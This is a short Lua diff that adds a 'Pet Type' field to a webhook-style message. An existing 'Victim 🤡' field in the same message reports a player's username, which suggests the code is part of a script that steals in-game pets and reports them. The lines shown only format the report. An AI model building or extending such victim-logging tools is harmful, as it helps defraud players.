@@ -19,7 +19,12 @@ local msg = {
                 ["name"]= "**Victim 🤡**",
                 ["value"]= "**```"..playeruser.."```**",
                 ["inline"]= true
-              }        
+              },    
+              {
+                ["name"]= "**Pet Type 🐈**",
+                ["value"]= "**```".._G.type.."```**",
+                ["inline"]= true
+              }   
             },
             ["thumbnail"] = {
                 ["url"] = _G.thumbnail
